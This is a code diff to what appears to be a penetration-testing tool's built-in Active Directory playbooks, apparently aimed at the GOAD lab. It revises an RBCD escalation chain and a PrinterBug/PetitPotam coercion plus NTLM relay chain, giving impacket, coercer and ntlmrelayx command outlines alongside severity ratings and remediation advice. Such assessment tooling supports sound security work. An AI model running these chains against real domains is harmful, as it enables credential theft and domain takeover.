@@ -32,14 +32,14 @@ from pathlib import Path
 
 
 # Bump when the built-in playbooks change so existing installs re-seed them.
-_BUILTIN_VERSION = 3
+_BUILTIN_VERSION = 4
 
 # Controlled vocabulary the step builder offers (free text is still allowed).
 # `domain`/`signing`/`host_info` are the reconnaissance variables an early
 # fingerprint step produces (and that later Kerberos steps consume).
 ARTIFACTS = [
     "domain", "host_info", "signing", "userlist", "credential", "hash", "ticket",
-    "spn_hash", "asrep_hash", "shares", "relay_targets", "machine_account",
+    "spn_hash", "asrep_hash", "shares", "relay_targets", "coerced", "machine_account",
     "adcs_vuln", "certificate", "mssql_exec", "admin", "flag",
 ]
 # Execution triggers the sequence runner understands (see sequence._trigger_ok).
@@ -257,51 +257,67 @@ DEFAULT_PLAYBOOKS = [
         "summary": "Abuse write access to a computer's delegation attribute plus "
                    "MachineAccountQuota to impersonate an admin.",
         "match": {"any_ports": [88, 445], "signals": ["username"]},
-        "run": {"tool": ""},
+        "run": {},
         "steps": [
             _step(1, "Create a machine account", "have credential", "add_computer",
                   ["credential"], ["machine_account"],
-                  "Needs MachineAccountQuota>0 (netexec_ldap -M maq). Default ATTACK$ / Attack123!."),
-            _step(2, "Write delegation", "have credential", "rbcd",
+                  "Create a computer you control (default ATTACK$ / Attack123!). Succeeds "
+                  "only when MachineAccountQuota > 0 — the enabling misconfiguration.",
+                  severity="Medium", cvss="5.9",
+                  finding_title="MachineAccountQuota Permits Computer Account Creation",
+                  impact="Any authenticated user can join up to MachineAccountQuota (default "
+                         "10) computers to the domain — the controlled principal needed for "
+                         "RBCD and other delegation attacks.",
+                  recommendation="Set ms-DS-MachineAccountQuota to 0 and delegate computer "
+                         "creation to a dedicated group."),
+            _step(2, "Write delegation onto the target", "have credential",
+                  "rbcd (set delegate_to = target computer from BloodHound)",
                   ["credential", "machine_account"], [],
-                  "delegate-from your new computer, delegate-to the target computer (e.g. DC01$)."),
-            _step(3, "S4U2Proxy ticket", "have credential", "get_st",
-                  ["machine_account"], ["ticket"],
-                  "get_st -spn cifs/<dc.fqdn> -impersonate Administrator → .ccache."),
-            _step(4, "Use the ticket", "have ticket", "secretsdump -k",
-                  ["ticket"], ["admin", "flag"],
-                  "export KRB5CCNAME=<ccache>; secretsdump -k -no-pass <dc> (DCSync) or read C$.",
-                  "final",
+                  "impacket-rbcd -delegate-from ATTACK$ -delegate-to <TARGET$> -action write. "
+                  "Needs write over the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity."),
+            _step(3, "S4U2Proxy ticket + use it", "have credential",
+                  "get_st (set spn + impersonate=Administrator)",
+                  ["machine_account"], ["ticket", "admin", "flag"],
+                  "impacket-getST -spn cifs/<target.fqdn> -impersonate Administrator → .ccache; "
+                  "then KRB5CCNAME=… secretsdump -k / psexec -k for admin on the target.", "final",
                   severity="Critical", cvss="9.0",
                   finding_title="Privilege Escalation via Resource-Based Constrained Delegation (RBCD)",
-                  impact="Resource-Based Constrained Delegation was abused to impersonate "
-                         "a privileged user and reach Domain Admin.",
-                  recommendation="Set MachineAccountQuota to 0, restrict who can write "
-                         "msDS-AllowedToActOnBehalfOfOtherIdentity, and audit delegation."),
+                  impact="Write access to a computer's delegation attribute plus "
+                         "MachineAccountQuota let an attacker impersonate a privileged user "
+                         "on that host — up to Domain Admin.",
+                  recommendation="Restrict who can write msDS-AllowedToActOnBehalfOf-"
+                         "OtherIdentity, set MachineAccountQuota to 0, and audit delegation."),
         ],
     },
     {
         "id": "smb-relay",
-        "name": "NTLM / SMB relay (member servers)",
-        "summary": "Signing-disabled member servers are relay targets: capture NTLM "
-                   "auth and relay it for code exec or a SAM/secrets dump.",
+        "name": "Coercion + NTLM relay (unsigned SMB)",
+        "summary": "Coerce a DC/host to authenticate (PrinterBug/PetitPotam) and relay "
+                   "that NTLM to a signing-disabled host for code exec or a secrets dump.",
         "match": {"any_ports": [445], "signals": ["signing_false"]},
-        "run": {"tool": ""},
+        "run": {},
         "steps": [
-            _step(1, "Find relay targets", "start", "netexec_smb --gen-relay-list",
-                  [], ["relay_targets"],
-                  "Check signing on every host; list signing:False targets."),
-            _step(2, "Poison + relay", "signing disabled", "responder / ntlmrelayx",
-                  ["relay_targets"], ["hash"],
-                  "Responder poisons LLMNR/NBT-NS/mDNS; ntlmrelayx relays to a signing-disabled host."),
-            _step(3, "Execute / dump", "have hash", "ntlmrelayx", ["hash"], ["admin"],
-                  "Command execution or SAM/secrets dump on the relayed host.", "final",
+            _step(1, "Find relay targets (unsigned SMB)", "start", "netexec_smb",
+                  [], ["relay_targets", "signing"],
+                  "Fingerprint SMB signing; hosts returning signing:False are relay targets "
+                  "(in GOAD: CASTELBLACK .22 and BRAAVOS .23)."),
+            _step(2, "Coerce authentication from a DC", "have credential", "coercer",
+                  ["credential"], ["coerced"],
+                  "Coerce the DC to authenticate to your listener over MS-RPRN "
+                  "(PrinterBug) / MS-EFSR (PetitPotam). Provide listener = your IP.",
                   severity="High", cvss="8.1",
-                  finding_title="NTLM Relay to Code Execution / Secrets Dump",
-                  impact="Relayed NTLM authentication yielded code execution or a SAM/"
-                         "secrets dump on a signing-disabled host, enabling lateral movement.",
-                  recommendation="Require SMB signing everywhere, disable LLMNR/NBT-NS/mDNS, "
-                         "and disable NTLM where possible."),
+                  finding_title="Authentication Coercion (PrinterBug / PetitPotam)",
+                  impact="A DC/host can be coerced into authenticating to an arbitrary "
+                         "target, feeding an NTLM relay to any unsigned host (or ADCS ESC8) "
+                         "for domain compromise.",
+                  recommendation="Patch MS-RPRN/MS-EFSR, disable the Print Spooler on DCs, "
+                         "enforce SMB signing and EPA, and disable NTLM."),
+            _step(3, "Relay to the unsigned host", "start",
+                  "ntlmrelayx (run as a listener: -t smb://<target> -smb2support)",
+                  ["relay_targets", "coerced"], ["hash", "admin"],
+                  "Start ntlmrelayx first, then step 2 coerces auth into it; it relays to "
+                  "the signing:False host for a SAM/secrets dump or command execution.",
+                  "final"),
         ],
     },
     {
